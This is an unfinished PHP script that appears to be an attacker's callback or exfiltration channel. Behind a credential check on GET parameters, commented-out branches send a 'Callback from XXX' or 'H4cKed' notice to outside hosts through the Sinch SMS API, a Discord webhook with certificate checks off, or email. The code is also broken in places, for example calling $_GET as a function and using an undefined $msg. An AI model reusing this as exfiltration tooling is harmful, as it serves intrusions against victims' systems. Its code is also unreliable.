<?php

// include creds files
include_once("creds.php");

if($_GET['user'] and $_GET['password']){
    $valid_creds = False;

    $user = $_GET['user'];
    $password = $_GET['password'];
    // check if the user and the password are good
    if(strcmp($user, USER) === 0 and strcmp($password, PASSWORD) === 0){
        $valid_creds = True;
    }else{
        $valid_creds = False;
    }
    
    if($valid_creds){
    
        // TODO: choose the exfiltrate channel : Discord, SMS, IRC, email, ...
        $message = "Callback from XXX";
        if(isset($_GET["chan"])!==null && $_GET["chan"]){
            $chan = $_GET("chan");
            switch($chan){
                case 'SMS';
                    // TODO send SMS

                    /*
                    // TODO add API keys and planid
                    $service_plan_id = "YOUR_servicePlanId";
                    $bearer_token = "YOUR_API_token";
                    // TODO find a phone number to send the message
                    $send_from = "YOUR_Sinch_virtual_number";
                    $recipient_phone_numbers = "recipient_phone_numbers"; 
                    
                    if(stristr($recipient_phone_numbers, ',')){
                      $recipient_phone_numbers = explode(',', $recipient_phone_numbers);
                    }else{
                      $recipient_phone_numbers = [$recipient_phone_numbers];
                    }
                    $content = [
                      'to' => array_values($recipient_phone_numbers),
                      'from' => $send_from,
                      'body' => $message
                    ];
                    $data = json_encode($content);
                    $ch = curl_init("https://us.sms.api.sinch.com/xms/v1/{$service_plan_id}/batches");
                    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BEARER);
                    curl_setopt($ch, CURLOPT_XOAUTH2_BEARER, $bearer_token);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    $result = curl_exec($ch);
                    if(curl_errno($ch)) {
                        echo 'Curl error: ' . curl_error($ch);
                    } else {
                        echo $result;
                    }
                    curl_close($ch);
                    */
                    break;
                case 'DISC';
                    // TODO send DISC
                    // Need a discord server ...
                    /*
                    $url = "https://discordapp.com/api/webhooks/xxxxxxxxx";
                    $headers = [ 'Content-Type: application/json; charset=utf-8' ];
                    $POST = [ 'username' => 'whoishere', 'content' => $message ];
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                    $response   = curl_exec($ch);
                    */
                    break;
                case 'EMAIL';
                    // TODO send EMAIL               
                    /*
                    $msg = wordwrap($msg,70);
                    mail("TBD","H4cKed",$message);
                    */
                    break;
            }
        }

    }
}
?>

